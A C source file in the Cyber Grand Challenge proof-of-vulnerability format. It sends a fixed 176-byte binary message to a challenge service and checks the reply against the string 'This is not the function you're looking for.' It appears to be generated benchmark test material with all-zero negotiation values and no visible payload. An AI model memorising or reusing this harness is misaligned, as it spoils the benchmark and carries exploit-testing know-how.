#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x03\x00\x00\x00\xff\x00\x00\x00\xf1\x58\x11\x6a\x8d\x78\xfc\x84"
         "\x06\x9d\xa6\x4d\x88\x6a\x4c\xcd\x97\x82\xa8\x7d\xfa\x2f\x3f\x83"
         "\x40\xa2\xde\x45\xae\x21\xfa\x40\xdf\x28\x20\x6f\x67\x4b\x68\x81"
         "\xbd\x58\x2e\x59\xb8\x51\xbc\xf8\x4a\xeb\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\xc9\xd2\x67\x80\x76\x35\x6d\x44\xb3\x6d\xfc\x7a"
         "\x82\x3e\x8e\xdd\x88\x6a\x4c\xcd\x97\x82\xa8\x7d\x2e\x13\x7a\x1f"
         "\xc5\xbe\x5d\xda\x1f\x87\x71\x36\x10\x84\x3c\x07\x66\x35\xe1\x2e";
      static unsigned int write_00000_00000_len = 176;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x54\x68\x69\x73\x20\x69\x73\x20\x6e\x6f\x74\x20\x74\x68\x65\x20"
         "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x79\x6f\x75\x27\x72\x65\x20"
         "\x6c\x6f\x6f\x6b\x69\x6e\x67\x20\x66\x6f\x72\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 44);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
